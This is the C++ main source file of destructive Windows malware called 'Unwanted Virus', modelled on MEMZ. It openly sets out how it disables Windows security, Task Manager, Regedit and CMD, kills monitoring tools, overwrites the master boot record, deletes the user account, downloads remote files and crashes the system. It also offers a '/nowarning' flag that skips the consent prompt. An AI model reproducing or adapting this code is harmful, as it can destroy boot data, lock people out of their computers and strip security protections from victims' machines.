﻿/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|   main program "main.cpp"                  |
|                                            |
|   Copyright (c) 2021 BenjaminFretez        |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <shlwapi.h> // Required for check file existence
#include <cstdlib> // Required for no "ambiguous"
#include <stdlib.h> // Same
#include "data.h" // For Data
#include "payload.h" // For payloads
#include <stdio.h>


#pragma warning (disable: 4244)
#pragma warning (disable: 4715) // For fucking DisableCmdExist function
#pragma warning (disable: 4566) // For fucking Universal-Character-Name I know it cannot be represented in current code page.

/* required for downloading files */
#pragma comment (lib, "urlmon.lib")
#include <wininet.h>
#pragma comment(lib,"Wininet.lib")

#define VERSIONCOMP "next" // "bruh" for bruh version behavior

/*------------------------------------------------+
| Arguments payload (Used for development)        |
| nosettings No MS-Settings payload               |
| experimental Old 1.0 Version                    |
| otheruser Other user payload                    |
| disablepoweroptions Registry Payload            |
| killwindowsinstant Kill Windows Instant         |
| startmalwarewithlog Start malware with log      |
| startonlymsgbox Start only message box          |
| idiotmode Idiot payload                         |
| see-iam-alone easteregg lolollololol            |
| skipdestroymbr Skip Destroy MBR Payload         |
| skiplogonui Skip LogonUI payload                |
| changetext Change Text Payload                  |
+-------------------------------------------------*/


int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    // Arguments command line side 

    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc > 1) {    
        if (!lstrcmpW(argv[1], L"testreg")) {
            testreg();
            return 0;
        }
        if (!lstrcmpW(argv[1], L"gdi1")) {
            CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
            MessageBox(
                NULL,
                (LPCWSTR)L"OK, you missed the fun...",
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                MB_ICONINFORMATION | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"fonts")) {
            Fonts(); // Create Desktop Files
            return 0;
        }
        if (!lstrcmpW(argv[1], L"createdesktopfiles")) {
            CreateDesktopFiles(); // Create Desktop Files
            return 0;
        }
        if (!lstrcmpW(argv[1], L"nosettings")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto warning;
        }
        if (!lstrcmpW(argv[1], L"otheruser")) {
            if (MessageBoxA(NULL, "This payload is very harmful to use, this means you cannot relogin again on your computer\r\n\r\nAre you sure to continue?", "Unwanted Virus", MB_YESNO | MB_ICONWARNING) != IDYES) {
                ExitProcess(0);
            }
            StartFuckingPC();
            return 0;
        }
        if (!lstrcmpW(argv[1], L"disablepoweroptions")) {
            if (MessageBoxA(NULL, "This payload is very harmful to use, this changes registry values to make you computer unusable anymore\r\n\r\nAre you sure to continue?", "Unwanted Virus", MB_YESNO | MB_ICONWARNING) != IDYES) {
                ExitProcess(0);
            }
            DisablePowerOptions();
            return 0;
        }
        if (!lstrcmpW(argv[1], L"disableWindowsSecurity")) {
            if (MessageBoxW(NULL, L"Windows security will be disable this can be dangerous to your system that means if you press yes everything goes to s³€ð\r\n\r\nTHIS ALSO IS IMPOSSIBLE TO UNDO, PLEASE THINK WHAT ARE YOU GOING TO DO!", NULL, MB_ICONWARNING | MB_YESNO) != IDYES) {
                return -8;
            }
            DisableSecurity();
            return 0;
        }
        if (!lstrcmpW(argv[1], L"killwindowsinstant")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            
            Sleep(1000);

            CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
            CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
            CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
        }
        if (!lstrcmpW(argv[1], L"startmalwarewithlog"))
        {
            MessageBox(NULL, L"Sorry but this mode was only avaliable when this program was developed and when was a CLI program, now this is a WUI program and this is not avaliable, also why a malware just have a log?", L"Log mode", MB_ICONINFORMATION | MB_OK);
            goto warning;
            /*
            SetConsoleTitle(TEXT("Unwanted Virus Console Window"));
            system("cls");
            NoUnwanted1();
            cout << "Unwanted Virus Console Versión [2.0.666.0]\n";
            cout << "(c) BenjaminFretez. Todos los derechos reservados.\n\n";
            cout << "This malware is not ready for be used on this mode, are u sure to continue?[y/n]\n";
            cout << "[ Input ] > ";

            int DisplayResourceNameMessageBox();
            {
                int startmsg = MessageBox(
                    NULL,
                    (LPCWSTR)L"Are you sure to run this program?", // Warning message box
                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                    MB_ICONWARNING | MB_YESNO
                );

                switch (startmsg)
                {
                case IDYES:
                    cout << "Y"; Sleep(100); cout << "e"; Sleep(100); cout << "s"; Sleep(100); cout << "  "; Sleep(100); cout << "=";  Sleep(100); cout << ")"; Sleep(100);
                    cout << "\n\n";
                    Sleep(200);
                    goto malware; // run malware
                case IDNO:
                    cout << "N"; Sleep(100); cout << "o"; Sleep(100);
                    cout << "\n\n";
                    Sleep(200);
                    int startmsg = MessageBox(
                        NULL,
                        (LPCWSTR)L"OK, you missed the fun...",
                        (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                        MB_ICONINFORMATION | MB_OK
                    );
                    NoUnwanted0();
                    break;
                }
                return startmsg;
            }*/

        }
        if (!lstrcmpW(argv[1], L"startonlymsgbox")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window

            MessageBox(
                NULL,
                (LPCWSTR)L"Now you are going to start `startonlymsgbox` mode\nYou can kill all with TaskMgr! =)", // Warning message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                MB_ICONERROR | MB_OK
            );

            CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
            while(1){}
        }
        if (!lstrcmpW(argv[1], L"changetext")) {
            if (MessageBoxA(hwnd,
                "unrecommended - continue?",
"Úñåáñþéð ß¾®ü’- 'ctp'", MB_YESNO | MB_ICONWARNING) != IDYES) {
                ExitProcess(0);
            }
            CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);

            MessageBox(
                NULL,
                (LPCWSTR)L"end `changetext`?", // Warning message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                MB_ICONERROR | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"deskicomov")) {
            CreateThread(NULL, NULL, &payloadThread, &MoveDesktopIcons, NULL, NULL);
            MessageBox(
                NULL,
                (LPCWSTR)L"end `deskicomov`?", // Warning message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                MB_ICONERROR | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"randbeep")) {
            CreateThread(NULL, NULL, &payloadThread, &RandBeep, NULL, NULL);

            MessageBox(
                NULL,
                (LPCWSTR)L"Click OK for end `randbeep` mode", // Warning message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                MB_ICONERROR | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"/about")) {
            cout << "Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 2.0.666.0";
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 3.0.666.0", // about msgbox
                (LPCWSTR)L"About Unwanted Virus",
                MB_ICONINFORMATION | MB_OK
            );
            return 0;
        }        
        if (!lstrcmpW(argv[1], L"see-iam-alone")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            Sleep(300);
            const wchar_t* UGOTROLLEDL = L"http://archive.org/download/01101000/0000004.bin";
            const wchar_t* UGOTROLLEDD = L"C:\\Program Files\\Common Files\\system\\ugottrolledhaha.png";
            if (S_OK == URLDownloadToFile(NULL, UGOTROLLEDL, UGOTROLLEDD, 0, NULL)) {
                // success
            }
            else // else kills os
            {
                CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
                int DisplayResourceNAMessageBox();
                {
                    int msgboxID = MessageBox(
                        NULL,
                        (LPCWSTR)L"Unknown hard error",
                        (LPCWSTR)L"Unwanted.exe - System Warning",
                        MB_ICONWARNING | MB_OK
                    );
                };
                int argc;
                LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
                if (argc > 1) {
                    if (!lstrcmpW(argv[1], L"skipdestroymbr")) {

                    }
                    else
                    {
                        DestroyMBR();
                    }
                }
                else
                {
                    DestroyMBR();
                }

                CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
                CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
                Sleep(200);
                CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

                Sleep(992);

                StartFuckingPC();
                DisablePowerOptions();
            };

            HANDLE ESCAPE = CreateFileA("C:\\The Escape is behind you", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

            WriteFile(ESCAPE, escapem, escape_len, &wb, NULL);

            CloseHandle(ESCAPE);


            ShellExecuteA(NULL, NULL, "notepad", "C:\\The Escape is behind you", NULL, SW_SHOWDEFAULT);

            Sleep(5000);

            const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\ugottrolledhaha.png";
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);

            CreateThread(NULL, NULL, &payloadThread, &Tada, NULL, NULL);

            int msgboxID = MessageBox(
                NULL,
                (LPCWSTR)L"U GOT TROLLED HAHAHA",
                (LPCWSTR)L"HAHAHAHAHAAHAHAHAH",
                NULL | MB_OK
            );

            Sleep(10000);

            return 0;
        } 
        if (!lstrcmpW(argv[1], L"/nowarning")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto malware; // Skips the Warning
        }
        if (!lstrcmpW(argv[1], L"/help")) {
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"/nowarning - Start Malware without warning\n/help - See other command arguments\n/why - Why i did this?\n/about - About this malware\n\nUse you I M A G I N A T I O N", // help message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’ - Hell",
                MB_ICONQUESTION | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"/?")) {
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"/nowarning - Start Malware without warning\n/help - See other command arguments\n/why - Why i did this?\n/about - About this malware\n\nUse you I M A G I N A T I O N", // help message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’ - Hell",
                MB_ICONQUESTION | MB_OK
            );
            return 0;
        }        
        if (!lstrcmpW(argv[1], L"/why")) {
            ShellExecuteA(NULL, NULL, "http://youtu.be/QbjYksxk4gA", NULL, NULL, SW_SHOWDEFAULT);
            return 0;
        }
        if (!lstrcmpW(argv[1], L"createmiwprogram")) {
            CreateTimeDate();
            return 0;
        }
        if (!lstrcmpW(argv[1], L"/hell")) {
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"H E L L", // hell message box
                (LPCWSTR)L"H E L L",
                MB_ICONERROR | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"skipdestroymbr")) { // skip destroy mbr
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto warning;
        }
        if (!lstrcmpW(argv[1], L"disablelogonoptions")) {
            DisableLogonOptions();
            return 0;
        }
        if (!lstrcmpW(argv[1], L"skiplogonui")){
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto warning;
        }
        if (!lstrcmpW(argv[1], L"experimental")) {
            HANDLE bat = CreateFileA("C:\\Program Files\\Common Files\\system\\Program.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

            WriteFile(bat, batm, bat_len, &wb, NULL);

            CloseHandle(bat);
            cout << "Archivo Creado\n\n";
            Sleep(100);

            ShellExecuteA(NULL, NULL, "cmd", "/c \u0022C:\\Program Files\\Common Files\\system\\Program.bat\u0022", NULL, SW_HIDE);
            cout << "Programa Ejecutado\n\n";
            Sleep(1000);
            ShellExecuteA(NULL, NULL, "notepad", "C:\\Program Files\\Common Files\\system\\Program.bat", NULL, SW_SHOWDEFAULT);
            cout << "Notepad abierto\n\n";
            Sleep(1000);


            return 0;
        }
        if (!lstrcmpW(argv[1], L"nomainpayload")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto DownloadFiles;
        }
        if (!lstrcmpW(argv[1], L"startmainpayload")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            CreateDesktopFiles(); // Create Desktop Files
            const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
            CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
            /* Main Payload */
            CreateThread(NULL, NULL, &payloadThread, &PlayMusik, NULL, NULL);
            Sleep(1500);
            CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
            Sleep(4500);
            ShellExecuteA(NULL, NULL, "write", "\u0022C:\\Program Files\\Common Files\\system\\Documento.rtf\u0022", NULL, SW_SHOWDEFAULT);
            Sleep(8500);
            ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(4500);
            CreateThread(NULL, NULL, &payloadThread, &payloadReverseText, NULL, NULL);
            CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
            Sleep(4500);
            ShellExecuteA(NULL, NULL, "regedit", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(4500);
            ShellExecuteA(NULL, NULL, "notepad", "\u0022C:\\Program Files\\Common Files\\system\\Die.txt\u0022", NULL, SW_SHOW);
            Sleep(4500);
            ShellExecuteA(NULL, NULL, "taskmgr", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(2250);
            ShellExecuteA(NULL, NULL, "explorer", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(2250);
            CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
            ShellExecuteA(NULL, NULL, "mspaint", "\u0022C:\\Program Files\\Common Files\\system\\kitten.jpg\u0022", NULL, SW_SHOWDEFAULT);
            Sleep(2250);
            ShellExecuteA(NULL, NULL, "charmap", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(6000);
            ShellExecuteA(NULL, NULL, "cmd", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(6000);
            ShellExecuteA(NULL, NULL, "notepad", "\u0022C:\\Program Files\\Common Files\\system\\Last.txt\u0022", NULL, SW_SHOW);
            Sleep(6000);
            CreateThread(NULL, NULL, &payloadThread, &RandBeep, NULL, NULL);
            CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);
            // last 10 seconds (wait until windows dies)
            Sleep(8000);

            //KWI(FOR;;1000)
            Sleep(1000);
            return 0;

        }
        else {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto warning;
        }
    }

    else {        
        // Start of the history
        // Here is the warning seen on the first place

        // ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window (Console heredated, now as Windows Application)
    warning:

        NoUnwanted1();

        // In case CMD.EXE is deleted or DisableCMD registry exists
        if (PathFileExistsA("C:\\Windows\\System32\\cmd.exe") != TRUE ||
            DisableCmdExist() == TRUE) {
            int DisplayResourceNameMessageBox();
            {
                int startmsg = MessageBox(
                    NULL,
                    (LPCWSTR)L"Are you sure to run this program?", // Warning message box
                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                    MB_ICONWARNING | MB_YESNO
                );

                switch (startmsg)
                {
                case IDYES:
                    NoUnwanted0();
                    MessageBox(
                        NULL,
                        (LPCWSTR)L"Sorry, but we cannot found the command interpreter so we cannot continue running this program, press OK to continue", // Warning message box
                        (LPCWSTR)L"Úñåáñþéð ß¾®ü’ - Program Error",
                        MB_ICONERROR | MB_OK
                    );
                    return 1;
                case IDNO:
                    NoUnwanted0();
                    ShellExecuteA(NULL, NULL, "http://youtu.be/D1qU745zMKU", NULL, NULL, SW_SHOWDEFAULT);
                    MessageBox(
                        NULL,
                        (LPCWSTR)L"ONLY IDIOTS CLICK NO!",
                        (LPCWSTR)L"ONLY IDIOTS CLICK NO!",
                        MB_ICONERROR | MB_OK
                    );
                    break;
                }
                return startmsg;
            }
        }
        else if (PathFileExistsA("C:\\Windows\\SysNative\\winlogon.exe") != TRUE && 
                PathFileExistsA("C:\\Windows\\System32\\winlogon.exe") != TRUE
                // SysNative instead of System32 because x64 computers redirects to SysWOW64
                // System32 is for x86 computers that checks if winlogon exists (Obviously returns True because exists), 
                // when this runs on x64 computers it will return False because WinLogon does not exist on SysWOW64
                // x86 = TRUE && !TRUE, x64 = !TRUE && TRUE, winlogon deleted = !TRUE && !TRUE, never = TRUE && TRUE
            ) {
            int DisplayResourceNameMessageBox();
            {
                int startmsg = MessageBox(
                    NULL,
                    (LPCWSTR)L"Are you sure to run this program?", // Warning message box
                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                    MB_ICONWARNING | MB_YESNO
                );
                // In case you just press yes or no is the same
                CreateThread(NULL, NULL, &payloadThread, &NormalComputer, NULL, NULL);
                ShellExecuteA(NULL, NULL, "shutdown", "/r /t 3", NULL, SW_HIDE);
                CreateThread(NULL, NULL, &payloadThread, &NormalComputer, NULL, NULL);
                for (;;) {
                    NULL; // For ever, do nothing...
                }
            }
        }
        else // The normal warning, this should be seen when system is normal.
        {
            int DisplayResourceNameMessageBox();
            {
                int startmsg = MessageBox(
                    NULL,
                    (LPCWSTR)L"Are you sure to run this program?", // Warning message box
                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                    MB_ICONWARNING | MB_YESNO
                );

                switch (startmsg)
                {
                case IDYES:
                    goto malware; // run malware
                case IDNO:
                    int startmsg = MessageBox(
                        NULL,
                        (LPCWSTR)L"OK, you missed the fun...",
                        (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                        MB_ICONINFORMATION | MB_OK
                    );
                    NoUnwanted0();
                    break;
                }
                return startmsg;
            }
        }



    malware:          
        if (VERSIONCOMP == "bruh") {
            CreateThread(NULL, 4096, &warningfinalpayload, NULL, NULL, NULL);
            CreateThread(NULL, NULL, &payloadThread, &beepsandlights, NULL, NULL);
        }

        NoUnwanted1();
        SetTimeDate();
        TestInternetConnection();
        DisableSecurity();
        DisableDesktopBackground();
        DisableRun();
        Sleep(1000);
        PlaySound(TEXT("C:\\Windows\\Media\\Windows Recycle.wav"), NULL, SND_ASYNC);
        StartFuckingPC(); // Deletes the user then activates other user
        Fonts();

        // Destroy the MBR =)
        if (argc > 1) {
            if (!lstrcmpW(argv[1], L"skipdestroymbr")) {

            }
            else
            {
                DestroyMBR();
            }
        }
        else
        {
            DestroyMBR();
        }
        // Destroys MBR and continue
        DisableLogonOptions(); // Disable Logon Options, like Network and ShutDown
        DisablePowerOptions(); // Disable Power Options on LogonUI
        ShellExecuteA(NULL, NULL, "Taskkill", "/f /im ProcessHacker.exe", NULL, SW_HIDE); // Kills Process Hacker in case if it is open
        ShellExecuteA(NULL, NULL, "Taskkill", "/f /im Taskmgr.exe", NULL, SW_HIDE); DisableTaskmgr();// Kills Task Manager and disable it        
        ShellExecuteA(NULL, NULL, "Taskkill", "/f /im RegEdit.exe", NULL, SW_HIDE);// Kills Regedit in case if it is open
        ShellExecuteA(NULL, NULL, "Taskkill", "/f /im Cmd.Exe", NULL, SW_HIDE); // Kills Command Prompt for disable it
        Sleep(200); // Waits 200 Miliseconds       
        DisableCMD(); // Disable Command Prompt
        DisableRegistryTools(); // Disable Regedit
        Sleep(2000); // Sleep 2 seconds
        

        DownloadFiles:

        if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))
        {
            // success

        }
        // else kills os
        else
        {
            CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
            int DisplayResourceNAMessageBox();
            {
                int msgboxID = MessageBox(
                    NULL,
                    (LPCWSTR)L"Unknown hard error",
                    (LPCWSTR)L"Unwanted.exe - System Warning",
                    MB_ICONWARNING | MB_OK
                );
            };
            int argc;
            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
            if (argc > 1) {
                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {

                }
                else
                {
                    DestroyMBR();
                }
            }
            else
            {
                DestroyMBR();
            }

            CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
            CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
            Sleep(200);
            CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

            Sleep(992);

            StartFuckingPC();
            DisablePowerOptions();

            return -1;
        };

        CreateDataFiles(); // Create notepads

        /* The part of downloading required files */
        if (S_OK == URLDownloadToFile(NULL, srcURL1, destFile1, 0, NULL))
        {
            Sleep(1000);
            const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
            CreateDesktopFiles(); // Create Desktop Files
            // success
        }
        // else kills os
        else
        {
            CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
            int DisplayResourceNAMessageBox();
            {
                int msgboxID = MessageBox(
                    NULL,
                    (LPCWSTR)L"Unknown hard error",
                    (LPCWSTR)L"Unwanted.exe - System Warning",
                    MB_ICONWARNING | MB_OK
                );
            };
            int argc;
            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
            if (argc > 1) {
                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {

                }
                else
                {
                    DestroyMBR();
                }
            }
            else
            {
                DestroyMBR();
            }

            CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
            CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
            Sleep(200);
            CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

            Sleep(992);

            StartFuckingPC();
            DisablePowerOptions();

            return -1;
        };
        if (S_OK == URLDownloadToFile(NULL, srcURL8, destFile8, 0, NULL))
        {
            // success

        }
        // else kills os
        else
        {
            CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
            int DisplayResourceNAMessageBox();
            {
                int msgboxID = MessageBox(
                    NULL,
                    (LPCWSTR)L"Unknown hard error",
                    (LPCWSTR)L"Unwanted.exe - System Warning",
                    MB_ICONWARNING | MB_OK
                );
            };
            int argc;
            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
            if (argc > 1) {
                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {

                }
                else
                {
                    DestroyMBR();
                }
            }
            else
            {
                DestroyMBR();
            }

            CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
            CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
            Sleep(200);
            CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

            Sleep(992);

            StartFuckingPC();
            DisablePowerOptions();

            return -1;
        };

        const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg"; // In case is not set, set it >:(
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);

        // Open Notepad with the note
        ShellExecuteA(NULL, NULL, "notepad.exe", "C:\\note.txt", NULL, SW_SHOW);


        Sleep(5000);

        if (S_OK == URLDownloadToFile(NULL, srcURLk, destFilek, 0, NULL))
        {
            Sleep(300);
            // success

        }
        // else kills os
        else
        {
            CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
            int DisplayResourceNAMessageBox();
            {
                int msgboxID = MessageBox(
                    NULL,
                    (LPCWSTR)L"Unknown hard error",
                    (LPCWSTR)L"Unwanted.exe - System Warning",
                    MB_ICONWARNING | MB_OK
                );
            };
            DestroyMBR();

            int argc;
            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
            if (argc > 1) {
                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {

                }
                else
                {
                    DestroyMBR();
                }
            }
            else
            {
                DestroyMBR();
            }

            CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
            CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
            Sleep(200);
            CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

            Sleep(992);

            StartFuckingPC();
            DisablePowerOptions();

            return -1;
        };

        // No main Payload - Payload =)
        if (argc > 1) {
            if (!lstrcmpW(argv[1], L"nomainpayload")) {
                Sleep(300);
                return 0;
            }
            else
            {
                // Still there
            }
        }
        
        /* Main Payload, where your computer dies */

        CreateThread(NULL, NULL, &payloadThread, &PlayMusik, NULL, NULL); // Play the PIANO music >:)
        Sleep(100); // Wait 100 mili-second

        CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
        Sleep(100); // Wait 100 mili-second

        CreateThread(NULL, NULL, &payloadThread, &superPowerFulMainPayload, NULL, NULL);
        Sleep(65000);//system("title Last note -- Unwanted Virus & type \u0022C:\\Program Files\\Common Files\\system\\Last.txt\u0022 & pause > nul
        ShellExecuteA(NULL, NULL, "notepad", "C:\\Program Files\\Common Files\\system\\Last.txt", NULL, SW_SHOW);
        Sleep(12000);
        killWindowsInstant();

        return 0; // Unnecessary main return
    }
    }